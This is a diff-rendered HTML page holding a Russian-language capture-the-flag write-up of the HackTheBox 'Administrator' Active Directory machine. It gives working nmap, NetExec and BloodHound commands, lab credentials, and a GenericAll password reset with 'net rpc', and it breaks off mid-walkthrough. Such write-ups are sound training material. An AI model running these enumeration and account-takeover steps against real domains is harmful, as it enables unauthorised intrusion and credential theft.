+        MITRE ATT&amp;CK Mapping
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1046-t1087002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Разведка — T1046, T1087.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1098-t1005-t1110002-t1552001" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Компрометация новых учетных записей и первый флаг — T1098, T1005, T1110.002, T1552.001
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#t1558003-t1110002-t1003006-t1550002" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Компрометация домена и второй флаг — T1558.003, T1110.002, T1003.006, T1550.002
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Извлеченные уроки
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Источники
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags">
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:active-directory" class="md-tag">Active Directory</a>
+      
+    
+      
+      
+      
+      
+        <a href="../../tags/#tag:windows" class="md-tag">Windows</a>
+      
+    
+  </nav>
+
+
+
+  <h1>HTB: Administrator (Medium)</h1>
+
+<p><span class="twemoji"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m22.51 6.457.001-.013a.89.89 0 0 0-.271-.638l-.027-.024q-.028-.025-.057-.048-.03-.022-.06-.04l-.029-.02-9.61-5.547a.89.89 0 0 0-.922.004L1.933 5.674l-.03.02-.023.014-.02.015a1 1 0 0 0-.147.134l-.003.003a.9.9 0 0 0-.221.584v.014l-.001.027v11.07c0 .328.18.63.469.784l9.599 5.542.023.011a1 1 0 0 0 .166.07l.04.01.072.015q.018.004.035.006a.8.8 0 0 0 .216 0q.018-.002.035-.006l.072-.014.04-.012.064-.022a1 1 0 0 0 .102-.047l.023-.011 9.599-5.542a.89.89 0 0 0 .469-.784V6.478zM5.255 6.082l6.537-3.774a.42.42 0 0 1 .418 0l6.537 3.774a.418.418 0 0 1 0 .725l-6.537 3.774a.42.42 0 0 1-.418 0L5.254 6.807a.418.418 0 0 1 0-.725m5.614 14.345a.417.417 0 0 1-.626.361l-6.524-3.766a.42.42 0 0 1-.209-.361V9.127a.417.417 0 0 1 .626-.361l6.524 3.766a.42.42 0 0 1 .209.362zm9.623-3.766a.42.42 0 0 1-.209.36l-6.524 3.767a.417.417 0 0 1-.626-.36v-7.533c0-.15.08-.287.209-.362l6.524-3.766a.417.417 0 0 1 .626.36z"></path></svg></span> <a href="https://app.hackthebox.com/machines/Administrator">Комната на HackTheBox</a></p>
+<div class="admonition danger">
+<p class="admonition-title">ОБРАТИТЕ ВНИМАНИЕ!</p>
+<p>В ходе написания райтапа и прикрепления вывода терминала/скриншотов с результатами работы различных тулов я не скрываю полученные хэши/пароли/флаги (иные подсказки) для того, чтобы люди, столкнувшиеся с определенными трудностями на каком-либо этапе, могли использовать мой райтап в качестве подсказки. Для тех, кто столкнулся с определенными сложностями в процессе компрометации данной машины, но не хочет получать готовые ответы, я использую спойлеры, под которыми находится вся секретная информация.</p>
+</div>
+<h2 id="_1">Резюме<a class="headerlink" href="#_1" title="Permanent link">¶</a></h2>
+<p><strong>Administrator</strong> - это машина на <strong>HackTheBox</strong> сложности уровня <strong>Medium</strong>. На данной машине представлена ОС Windows с доменом Active Directory. В качестве первоначального доступа автор предоставил нам учетные данные одного из пользователей домена <code>olivia</code>. В ходе перечисления домена с помощью <code>BloodHound</code> были обнаружены небезопасные права по отношению к другим учетным записям, приведшие к их компрометации: <code>olivia</code> --&gt; (GenericAll) --&gt; <code>michael</code> --&gt; (ForceChangePassword) --&gt; <code>benjamin</code>. Воспользовавшись возможностью сбросить пароль в обоих случаях удалось скомпрометировать учетные записи <code>michael</code> и <code>benjamin</code>. С помощью учетной записи <code>benjamin</code> удалось аутентифицироваться на FTP-сервере, который находился на <strong>открытом 21 порту</strong>. На FTP-сервере была обнаружена база паролей <code>Backup.psafe3</code> одного из менеджера паролей <code>PasswordSafe</code>. Эта база была запаролена, но при помощи <code>hashcat</code> удалось взломать пароль и получить доступ к хранящимся в ней учетным данным. Среди учетных данных самыми перспективными оказались учетные данные пользователя <code>emily</code>, через которого выстроилась цепочка: <code>eimly</code> --&gt; (GenericWrite) --&gt; <code>ethan</code> --&gt; (DCSync) --&gt; DC. Пароль юзера <code>emily</code> был изъят из менеджера паролей, с помощью него удалось установить сессию при помощи <code>evil-winrm</code> и забрать первый флаг (<code>user.txt</code>). Воспользовавшись разрешением <code>GenericWrite</code> в отношении юзера <code>ethan</code> была проведена атака вида <code>targeted kerberoasting</code> при помощи тула <code>targetedKerberoast.py</code>. Полученный хэш tgs-билета был успешно взломан при помощи <code>hashcat</code>. С помощью пароля удалось выполнить дамп хэшей на контроллере домена с использованием тула <code>secretsdump.py</code>. Полученный хэш администратора использовался для установления сессии на хосте посредством <code>Pass-the-Hash</code>, что в итоге привело к взятию второго флага (<code>root.txt</code>).</p>
+<h2 id="_2">Цепочка атаки<a class="headerlink" href="#_2" title="Permanent link">¶</a></h2>
+<blockquote>
+<p>Port Scanning (nmap) ➔ AD Enumeration (BloodHound) ➔ Account Manipulation (net rpc ➔ michael) 
+➔ Account Manipulation (net rpc ➔ benjamin) ➔ Data Exfiltration (FTP) ➔ Offline Cracking (Hashcat ➔ Backup.psafe3) 
+➔ Credential Extraction ➔ Targeted Kerberoasting (GenericWrite ➔ ethan) ➔ TGS Cracking (Hashcat) 
+➔ DCSync Attack (secretsdump) ➔ Pass-the-Hash (evil-winrm) ➔ Domain Admin</p>
+</blockquote>
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping<a class="headerlink" href="#mitre-attck-mapping" title="Permanent link">¶</a></h2>
+<table>
+<thead>
+<tr>
+<th>Phase</th>
+<th>Tactic</th>
+<th>Technique</th>
+<th>ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Network Enumeration</td>
+<td>Discovery</td>
+<td>Network Service Discovery</td>
+<td>T1046</td>
+</tr>
+<tr>
+<td>AD Enumeration</td>
+<td>Discovery</td>
+<td>Account Discovery:  Domain Account</td>
+<td>T1087.002</td>
+</tr>
+<tr>
+<td>ACL Exploitation</td>
+<td>Privilege Escalation</td>
+<td>Account Manipulation</td>
+<td>T1098</td>
+</tr>
+<tr>
+<td>Data Collection</td>
+<td>Collection</td>
+<td>Data from Local System</td>
+<td>T1005</td>
+</tr>
+<tr>
+<td>Offline Cracking (psafe3)</td>
+<td>Credential Access</td>
+<td>Brute Force:  Password Cracking</td>
+<td>T1110.002</td>
+</tr>
+<tr>
+<td>Credential Extraction</td>
+<td>Credential Access</td>
+<td>Unsecured Credentials:  Credentials In Files</td>
+<td>T1552.001</td>
+</tr>
+<tr>
+<td>Targeted Kerberoasting</td>
+<td>Credential Access</td>
+<td>Steal or Forge Kerberos Tickets:  Kerberoasting</td>
+<td>T1558.003</td>
+</tr>
+<tr>
+<td>Offline Cracking (TGS)</td>
+<td>Credential Access</td>
+<td>Brute Force:  Password Cracking</td>
+<td>T1110.002</td>
+</tr>
+<tr>
+<td>Credential Dumping</td>
+<td>Credential Access</td>
+<td>OS Credential Dumping:  DCSync</td>
+<td>T1003.006</td>
+</tr>
+<tr>
+<td>Domain Privilege Escalation</td>
+<td>Lateral Movement</td>
+<td>Use Alternate Authentication Material:  Pass the Hash</td>
+<td>T1550.002</td>
+</tr>
+</tbody>
+</table>
+<h2 id="t1046-t1087002">Разведка — <code>T1046</code>, <code>T1087.002</code><a class="headerlink" href="#t1046-t1087002" title="Permanent link">¶</a></h2>
+<details class="note">
+<summary>Результат работы nmap</summary>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span>
+<span class="normal">17</span>
+<span class="normal">18</span>
+<span class="normal">19</span>
+<span class="normal">20</span>
+<span class="normal">21</span>
+<span class="normal">22</span>
+<span class="normal">23</span>
+<span class="normal">24</span>
+<span class="normal">25</span>
+<span class="normal">26</span>
+<span class="normal">27</span>
+<span class="normal">28</span>
+<span class="normal">29</span>
+<span class="normal">30</span>
+<span class="normal">31</span>
+<span class="normal">32</span>
+<span class="normal">33</span>
+<span class="normal">34</span>
+<span class="normal">35</span>
+<span class="normal">36</span>
+<span class="normal">37</span>
+<span class="normal">38</span>
+<span class="normal">39</span>
+<span class="normal">40</span>
+<span class="normal">41</span>
+<span class="normal">42</span>
+<span class="normal">43</span>
+<span class="normal">44</span>
+<span class="normal">45</span>
+<span class="normal">46</span>
+<span class="normal">47</span>
+<span class="normal">48</span>
+<span class="normal">49</span>
+<span class="normal">50</span>
+<span class="normal">51</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p-<span class="w"> </span><span class="m">10</span>.129.58.233
+<span class="go">Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-17 00:01 -0400</span>
+<span class="go">Nmap scan report for 10.129.58.233</span>
+<span class="go">Host is up (0.096s latency).</span>
+<span class="go">Not shown: 65509 closed tcp ports (reset)</span>
+<span class="go">PORT      STATE SERVICE       VERSION</span>
+<span class="go">21/tcp    open  ftp           Microsoft ftpd</span>
+<span class="go">| ftp-syst: </span>
+<span class="go">|_  SYST: Windows_NT</span>
+<span class="go">53/tcp    open  domain        Simple DNS Plus</span>
+<span class="go">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-17 11:08:58Z)</span>
+<span class="go">135/tcp   open  msrpc         Microsoft Windows RPC</span>
+<span class="go">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span>
+<span class="go">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)</span>
+<span class="go">445/tcp   open  microsoft-ds?</span>
+<span class="go">464/tcp   open  kpasswd5?</span>
+<span class="go">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">636/tcp   open  tcpwrapped</span>
+<span class="go">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)</span>
+<span class="go">3269/tcp  open  tcpwrapped</span>
+<span class="go">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">|_http-title: Not Found</span>
+<span class="go">9389/tcp  open  mc-nmf        .NET Message Framing</span>
+<span class="go">47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
+<span class="go">|_http-title: Not Found</span>
+<span class="go">|_http-server-header: Microsoft-HTTPAPI/2.0</span>
+<span class="go">49664/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49665/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49666/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49667/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">49668/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">51647/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span>
+<span class="go">51658/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">51663/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">51677/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">51710/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">56562/tcp open  msrpc         Microsoft Windows RPC</span>
+<span class="go">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span>
+
+<span class="go">Host script results:</span>
+<span class="go">| smb2-security-mode: </span>
+<span class="go">|   3.1.1: </span>
+<span class="go">|_    Message signing enabled and required</span>
+<span class="go">|_clock-skew: 7h00m02s</span>
+<span class="go">| smb2-time: </span>
+<span class="go">|   date: 2026-09-17T11:09:54</span>
+<span class="go">|_  start_date: N/A</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 528.15 seconds</span>
+</code></pre></div></td></tr></tbody></table></div>
+</details>
+<p>После сканирования портов становится понятно, что представленный хост является контроллером домена Active Directory. Самыми примечательными на данный момент для нас являются порты <code>21 (ftp)</code> и <code>445 (smb)</code>. У нас есть со старта учетные данныые одного из пользователей домена: <code>Olivia:ichliebedich</code>.</p>
+<p>Перед подключением к SMB было принято решение проверить возможность аутентификации в <code>ftp</code> с имеющимися учетными данными. Однако, эта попытка не увенчалась успехом. У данного пользователя нет доступа к <code>ftp</code>.</p>
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span>
+<span class="normal">5</span>
+<span class="normal">6</span>
+<span class="normal">7</span>
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>ftp<span class="w"> </span><span class="m">10</span>.129.58.233
+<span class="go">Connected to 10.129.58.233.</span>
+<span class="go">220 Microsoft FTP Service</span>
+<span class="go">Name (10.129.58.233:kali): Olivia</span>
+<span class="go">331 Password required</span>
+<span class="go">Password: </span>
+<span class="go">530 User cannot log in, home directory inaccessible.</span>
+<span class="go">ftp: Login failed</span>
+</code></pre></div></td></tr></tbody></table></div>
+<p>Для дальнейшего перечисления было решено воспользоваться тулом <code>NetExec</code>. В ходе перечисления были найдены доступные для просмотра шары, а также выполнено перечисление пользователей домена. Кроме того, использование <code>--generate-hosts-file</code> сгенерировало готовую строку для <code>/etc/hosts</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="1:3"><input checked="checked" id="__tabbed_1_1" name="__tabbed_1" type="radio"><input id="__tabbed_1_2" name="__tabbed_1" type="radio"><input id="__tabbed_1_3" name="__tabbed_1" type="radio"><div class="tabbed-labels"><label for="__tabbed_1_1">Shares</label><label for="__tabbed_1_2">Users</label><label for="__tabbed_1_3">/etc/hosts</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.233<span class="w"> </span>-u<span class="w"> </span><span class="s1">'olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span>--shares
+<span class="go">SMB         10.129.58.233   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) </span>
+<span class="gp gp-VirtualEnv">(signing:True)</span> <span class="go">(SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.58.233   445    DC               [+] administrator.htb\olivia:ichliebedich </span>
+<span class="go">SMB         10.129.58.233   445    DC               [*] Enumerated shares</span>
+<span class="go">SMB         10.129.58.233   445    DC               Share           Permissions     Remark</span>
+<span class="go">SMB         10.129.58.233   445    DC               -----           -----------     ------</span>
+<span class="go">SMB         10.129.58.233   445    DC               ADMIN$                          Remote Admin</span>
+<span class="go">SMB         10.129.58.233   445    DC               C$                              Default share</span>
+<span class="go">SMB         10.129.58.233   445    DC               IPC$            READ            Remote IPC</span>
+<span class="go">SMB         10.129.58.233   445    DC               NETLOGON        READ            Logon server share </span>
+<span class="go">SMB         10.129.58.233   445    DC               SYSVOL          READ            Logon server share </span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span>
+<span class="normal">13</span>
+<span class="normal">14</span>
+<span class="normal">15</span>
+<span class="normal">16</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.233<span class="w"> </span>-u<span class="w"> </span><span class="s1">'olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span>--users
+<span class="go">SMB         10.129.58.233   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) </span>
+<span class="gp gp-VirtualEnv">(domain:administrator.htb)</span> <span class="go">(signing:True) (SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.58.233   445    DC               [+] administrator.htb\olivia:ichliebedich </span>
+<span class="go">SMB         10.129.58.233   445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               </span>
+<span class="go">SMB         10.129.58.233   445    DC               Administrator                 2024-10-22 18:59:36 0       Built-in account for administering the computer/domain </span>
+<span class="go">SMB         10.129.58.233   445    DC               Guest                         &lt;never&gt;             0       Built-in account for guest access to the computer/domain </span>
+<span class="go">SMB         10.129.58.233   445    DC               krbtgt                        2024-10-04 19:53:28 0       Key Distribution Center Service Account </span>
+<span class="go">SMB         10.129.58.233   445    DC               olivia                        2024-10-06 01:22:48 0        </span>
+<span class="go">SMB         10.129.58.233   445    DC               michael                       2024-10-06 01:33:37 0        </span>
+<span class="go">SMB         10.129.58.233   445    DC               benjamin                      2024-10-06 01:34:56 0        </span>
+<span class="go">SMB         10.129.58.233   445    DC               emily                         2024-10-30 23:40:02 0        </span>
+<span class="go">SMB         10.129.58.233   445    DC               ethan                         2024-10-12 20:52:14 0        </span>
+<span class="go">SMB         10.129.58.233   445    DC               alexander                     2024-10-31 00:18:04 0        </span>
+<span class="go">SMB         10.129.58.233   445    DC               emma                          2024-10-31 00:18:35 0        </span>
+<span class="go">SMB         10.129.58.233   445    DC               [*] Enumerated 10 local users: ADMINISTRATOR</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.233<span class="w"> </span>-u<span class="w"> </span><span class="s1">'olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span>--generate-hosts-file<span class="w"> </span>adm_hosts
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Полученную строку для <code>/etc/hosts</code> вы можете посмотреть под спойлером.</p>
+<details class="note">
+<summary>Результат работы nxc</summary>
+<figure id="__screenshot_1">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/smb_generate_hosts_file.webp" data-desc-position="bottom"><img alt="Результат работы nxc" src="../images/administrator/smb_generate_hosts_file.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 1:</span> Результат работы nxc</p>
+</figcaption>
+</figure>
+</details>
+<p>Как видно из вывода <code>nxc</code>, в домене есть ещё 6 пользователей, не считая <code>olivia</code> и встроенные учетные записи. Среди существующих шар мне не удалось найти что-то поистине полезное, поэтому было решено выполнить сбор данных для <code>BloodHound</code>. Это можно сделать как с помощью опции <code>nxc --bloodhound</code>, так и с помощью отдельного тула <code>bloodhound-python</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="2:2"><input checked="checked" id="__tabbed_2_1" name="__tabbed_2" type="radio"><input id="__tabbed_2_2" name="__tabbed_2" type="radio"><div class="tabbed-labels"><label for="__tabbed_2_1">NetExec</label><label for="__tabbed_2_2">bloodhound-python</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
+<span class="normal"> 2</span>
+<span class="normal"> 3</span>
+<span class="normal"> 4</span>
+<span class="normal"> 5</span>
+<span class="normal"> 6</span>
+<span class="normal"> 7</span>
+<span class="normal"> 8</span>
+<span class="normal"> 9</span>
+<span class="normal">10</span>
+<span class="normal">11</span>
+<span class="normal">12</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>ldap<span class="w"> </span>DC.administrator.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">'olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span>--bloodhound<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--dns-server<span class="w"> </span><span class="m">10</span>.129.58.233
+<span class="go">LDAP        10.129.58.233   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) </span>
+<span class="gp gp-VirtualEnv">(channel binding:No TLS cert)</span> 
+<span class="go">LDAP        10.129.58.233   389    DC               [+] administrator.htb\olivia:ichliebedich </span>
+<span class="go">LDAP        10.129.58.233   389    DC               Resolved collection methods: acl, adcs, container, dcom, group, </span>
+<span class="go">localadmin, loggedon, objectprops, psremote, rdp, session, trusts</span>
+<span class="go">LDAP        10.129.58.233   389    DC               Excluded collection methods: </span>
+<span class="go">LDAP        10.129.58.233   389    DC               Bloodhound data collection completed in 0M 3S</span>
+<span class="go">LDAP        10.129.58.233   389    DC               Collecting ADCS data (CertiHound)...</span>
+<span class="go">LDAP        10.129.58.233   389    DC               Found 0 certificate templates</span>
+<span class="go">LDAP        10.129.58.233   389    DC               Found 0 Enterprise CAs</span>
+<span class="go">LDAP        10.129.58.233   389    DC               Compressing output into /home/imbadika44/.nxc/logs/DC_10.129.58.233_2026-09-17_004053_bloodhound.zip</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">'olivia'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'ichliebedich'</span><span class="w"> </span>-d<span class="w"> </span><span class="s1">'administrator.htb'</span><span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.129.58.233<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<h2 id="t1098-t1005-t1110002-t1552001">Компрометация новых учетных записей и первый флаг — <code>T1098</code>, <code>T1005</code>, <code>T1110.002</code>, <code>T1552.001</code><a class="headerlink" href="#t1098-t1005-t1110002-t1552001" title="Permanent link">¶</a></h2>
+<p>После использования одного из тулов (<code>NetExec</code> или <code>bloodhound-python</code>) получаем архив, который загружаем, непосредственно, в сам <code>BloodHound</code> для дальнейшего перечисления домена.</p>
+<details class="note">
+<summary>GenericAll (olivia --&gt; michael)</summary>
+<figure id="__screenshot_2">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/bloodhound_olivia_to_michael.webp" data-desc-position="bottom"><img alt="GenericAll (olivia --&gt; michael)" src="../images/administrator/bloodhound_olivia_to_michael.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 2:</span> GenericAll (olivia --&gt; michael)</p>
+</figcaption>
+</figure>
+</details>
+<div class="admonition info">
+<p class="admonition-title">Обращаю Ваше внимание!</p>
+<p>Пользователь <code>BDK44@administrator.htb</code> не существует в исследуемом домене. Эта точка на графе была добавлена мной намеренно для подтверждения того, что все описываемые в данном райтапе действия выполняются лично мной. Эти скриншоты были сделаны во время непосредственной компрометации домена.</p>
+</div>
+<p>На скриншоте видно, что контролируемый нами юзер <code>olivia</code> имеет разрешение <code>GenericAll</code> в отношении юзера <code>michael</code>. В Active Directory разрешения и привилегии определяют, какие действия субъект (пользователь, группа или компьютер) может выполнять с другим объектом. Самым для нас примечательным является то, что мы, используя данное разрешение, можем сбросить пароль юзера <code>michael</code> и установить свой для того, чтобы затем аутентифицироваться от его имени. Более подробно разные методы эксплуатации данного разрешения описаны в хорошей статье за авторством <a href="https://www.hackingarticles.in/genericall-active-directory-abuse/"><img alt="🗒" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@16.0.1/assets/svg/1f5d2.svg" title=":notepad_spiral:"> Aarti Singh</a>.</p>
+<p>Воспользуемся найденным разрешением и изменим пароль <code>michael</code> на известный нам с помощью тула <code>net</code>. После проведенной манипуляции сразу проверим доступность юзера с новым паролем с помощью <code>NetExec</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="3:2"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio"><input id="__tabbed_3_2" name="__tabbed_3" type="radio"><div class="tabbed-labels"><label for="__tabbed_3_1">net</label><label for="__tabbed_3_2">NetExec</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>net<span class="w"> </span>rpc<span class="w"> </span>password<span class="w"> </span>michael<span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span>-U<span class="w"> </span>administrator.htb/olivia%ichliebedich<span class="w"> </span>-S<span class="w"> </span><span class="m">10</span>.129.58.233
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+<div class="tabbed-block">
+<div class="highlight"><table class="highlighttable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
+<span class="normal">2</span>
+<span class="normal">3</span>
+<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.129.58.233<span class="w"> </span>-u<span class="w"> </span><span class="s1">'michael'</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">'Password123!'</span>
+<span class="go">SMB         10.129.58.233   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) </span>
+<span class="gp gp-VirtualEnv">(domain:administrator.htb)</span> <span class="go">(signing:True) (SMBv1:None) (Null Auth:True)</span>
+<span class="go">SMB         10.129.58.233   445    DC               [+] administrator.htb\michael:Password123!</span>
+</code></pre></div></td></tr></tbody></table></div>
+</div>
+</div>
+</div>
+<p>Как видно в выводе <code>NetExec</code>, у юзера <code>michael</code> действительно пароль теперь <code>Password123!</code> (тот, который мы установили собственноручно). Теперь, когда мы скомпрометировали очередную учетную запись, мы можем, используя данные в <code>BloodHound</code>, исследовать её возможности.</p>
+<details class="note">
+<summary>ForceChangePassword (michael --&gt; benjamin)</summary>
+<figure id="__screenshot_3">
+<p><a class="glightbox" data-type="image" data-width="100%" data-height="auto" href="../images/administrator/bloodhound_michael_to_benjamin.webp" data-desc-position="bottom"><img alt="ForceChangePassword (michael --&gt; benjamin)" src="../images/administrator/bloodhound_michael_to_benjamin.webp"></a></p>
+<figcaption>
+<p><span class="caption-prefix">Скриншот 3:</span> ForceChangePassword (michael --&gt; benjamin)</p>
+</figcaption>
+</figure>
+</details>
+<p>На скриншоте № 2 видно, что ныне контролируемый нами юзер <code>michael</code> имеет разрешение <code>ForceChangePassword</code> в отношении юзера <code>benjamin</code>. Можно сказать, что перемещение от юзера <code>michael</code> к юзеру <code>benjamin</code> не будет ничем отличаться от перемещения от юзера <code>olivia</code> к юзеру <code>michael</code>, потому что мы точно также выполним сброс пароля с помощью того же тула (<code>net</code>). Обнаруженное разрешение <code>ForceChangePassword</code> позволяет нам это сделать. После ввода нового пароля сразу же проверим доступность скомпрометированного юзера <code>benjamin</code> с помощью <code>NetExec</code>.</p>
+<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio"><input id="__tabbed_4_2" name="__tabbed_4" type="radio"><div class="tabbed-labels"><label for="__tabbed_4_1">net</label><label for="__tabbed_4_2">NetExec</label></div>
+<div class="tabbed-content">
+<div class="tabbed-block">
